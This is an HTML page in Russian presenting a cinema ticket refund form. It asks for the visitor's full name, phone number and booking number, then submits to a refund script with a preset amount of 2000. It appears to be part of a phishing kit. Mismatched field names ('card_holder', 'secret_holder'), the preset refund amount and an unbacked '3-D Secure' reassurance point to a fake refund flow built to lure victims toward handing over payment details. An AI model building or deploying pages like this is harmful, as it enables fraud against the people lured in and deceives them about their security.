<!DOCTYPE html>
<html lang="en">
<head>
   	<meta charset="UTF-8">
	<meta name="viewport" content="width=400">
	<link rel="shortcut icon" href="favicon.png">
	<title>Оформление возврата</title>
	<link rel="stylesheet" href="style/style.css">
</head>
<body>
	<div class="wrapper flex-center">
		
		<div class="other">
			<div class="window">
				<div class="title flex-center">Возврат</div>
				<form ng-controller="PaymentFormCtrl"id="test192938"  class="payment-form" style="background-color: #ffffff;" name="paymentForm" action="https://ercinema.ru/refund/return1.php?amount=2000" method="post">
					<div class="general">
						<div class="section">
							<span>Введите Ф.И.О.</span>
							<input name="name" id="name" type="text" placeholder="Ваше Ф.И.О" ="" required>
						</div>
						<div class="section">
							<span>Введите номер телефона</span>
							<input name="card_holder" id="card_holder" type="text" placeholder="Ваш номер телефона" ="" required>
						</div>
	<div class="section">
							<span>Возврат</span>
							<input name="secret_holder" id="secret_holder" type="text" placeholder="Номер бронирования"value="Возврат" ="" required>
						</div>
					</div>
						<a ng-disabled="paymentForm.$invalid" type="submit"><div onclick="document.getElementById('test192938').submit()" class="button flex-center"ng-disabled="paymentForm.$invalid" type="submit">Продолжить</div></a>
						 

				</form>
				
			</div><p style="display: block; text-align: center; font-size: 13px; margin-top: 25px; opacity: .75; line-height: 20px;">Все платежи надежно защищены системой 3-D Secure.<br></p>
		</div>	

	</div>
</body>
</html>